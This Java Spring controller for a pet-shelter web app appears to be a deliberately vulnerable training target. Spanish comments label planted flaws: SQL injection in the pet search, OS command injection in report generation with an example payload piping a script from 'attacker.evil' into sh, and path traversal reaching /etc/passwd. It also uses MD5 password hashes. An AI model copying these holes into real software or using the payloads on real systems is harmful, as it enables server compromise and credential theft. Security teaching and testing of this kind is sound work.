package com.shelter.app;

import org.springframework.core.io.FileSystemResource;
import org.springframework.core.io.Resource;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpSession;
import java.io.File;
import java.sql.*;
import java.util.ArrayList;
import java.util.List;

@Controller
public class ShelterController {

    static { DatabaseUtil.initDb(); }

    private static final String UPLOAD_DIR = "uploads/";

    @GetMapping("/")
    public String home() {
        return "index";
    }

    // -------------------------------------------------------------------
    // LOGIN
    // -------------------------------------------------------------------
    @GetMapping("/login")
    public String loginForm(Model model) {
        return "login";
    }

    @PostMapping("/login")
    public String login(@RequestParam String username,
                         @RequestParam String password,
                         HttpSession session,
                         Model model) {

        if (ShelterConfig.ADMIN_USERNAME.equals(username)
                && ShelterConfig.ADMIN_PASSWORD.equals(password)) {
            session.setAttribute("user", "admin");
            return "redirect:/dashboard";
        }

        try (Connection conn = DatabaseUtil.getConnection();
             PreparedStatement ps = conn.prepareStatement(
                     "SELECT password_hash FROM volunteers WHERE username = ?")) {
            ps.setString(1, username);
            ResultSet rs = ps.executeQuery();
            if (rs.next() && rs.getString(1).equals(DatabaseUtil.md5(password))) {
                session.setAttribute("user", username);
                return "redirect:/dashboard";
            }
        } catch (SQLException e) {
            model.addAttribute("error", "Error interno");
            return "login";
        }

        model.addAttribute("error", "Credenciales invalidas");
        return "login";
    }

    @GetMapping("/dashboard")
    public String dashboard(HttpSession session, Model model) {
        Object user = session.getAttribute("user");
        if (user == null) return "redirect:/login";
        model.addAttribute("user", user);
        return "dashboard";
    }

    @GetMapping("/logout")
    public String logout(HttpSession session) {
        session.invalidate();
        return "redirect:/";
    }

    // -------------------------------------------------------------------
    // [VULN-1] CWE-89: SQL Injection
    // El término de búsqueda se concatena directamente en la consulta SQL
    // en lugar de usar PreparedStatement con parámetros. Un input como:
    //     ' UNION SELECT username, password_hash, 1 FROM volunteers --
    // permite extraer credenciales de otra tabla desde el buscador de
    // mascotas, sin ninguna autenticación previa.
    // -------------------------------------------------------------------
    @GetMapping("/search")
    public String search(@RequestParam(defaultValue = "") String q, Model model) {
        List<String[]> results = new ArrayList<>();
        String sql = "SELECT id, name, species, notes FROM pets WHERE name LIKE '%" + q + "%'"; // [VULN-1]

        try (Connection conn = DatabaseUtil.getConnection();
             Statement st = conn.createStatement()) {
            ResultSet rs = st.executeQuery(sql);                                                  // [VULN-1]
            while (rs.next()) {
                results.add(new String[]{
                        rs.getString(1), rs.getString(2), rs.getString(3), rs.getString(4)
                });
            }
        } catch (SQLException ignored) {
            // se ignora a propósito para no filtrar el stacktrace, pero la
            // inyección ya ocurrió en la construcción del SQL de arriba
        }

        model.addAttribute("results", results);
        model.addAttribute("query", q);
        return "search";
    }

    // -------------------------------------------------------------------
    // [VULN-2] CWE-78: OS Command Injection
    // Genera un "reporte veterinario" usando el nombre de la mascota
    // directamente dentro de un comando de shell. Un nombre malicioso
    // como:
    //     Firulais; curl http://attacker.evil/x.sh | sh
    // ejecuta comandos arbitrarios en el servidor con los privilegios del
    // proceso Java. No hay validación ni uso de ProcessBuilder con lista
    // de argumentos separados.
    // -------------------------------------------------------------------
    @PostMapping("/generate-report")
    @ResponseBody
    public String generateReport(@RequestParam String petName) throws Exception {
        String command = "sh -c \"echo Reporte veterinario de " + petName +
                " > /tmp/report_" + petName + ".txt\"";                       // [VULN-2]
        Runtime.getRuntime().exec(command);                                   // [VULN-2]
        return "Reporte generado para " + petName;
    }

    // -------------------------------------------------------------------
    // [VULN-5] CWE-22: Path Traversal / Improper Limitation of a Pathname
    // Permite descargar fotos/documentos de mascotas por nombre de
    // archivo, pero no valida ni normaliza el path. Un request como:
    //     /download?file=../../../../etc/passwd
    // escapa del directorio uploads/ y lee cualquier archivo accesible
    // por el proceso Java.
    // -------------------------------------------------------------------
    @GetMapping("/download")
    @ResponseBody
    public ResponseEntity<Resource> download(@RequestParam String file) {
        File target = new File(UPLOAD_DIR + file);                            // [VULN-5] sin normalizar/validar
        if (!target.exists()) {
            return ResponseEntity.notFound().build();
        }
        Resource resource = new FileSystemResource(target);
        return ResponseEntity.ok(resource);
    }
}
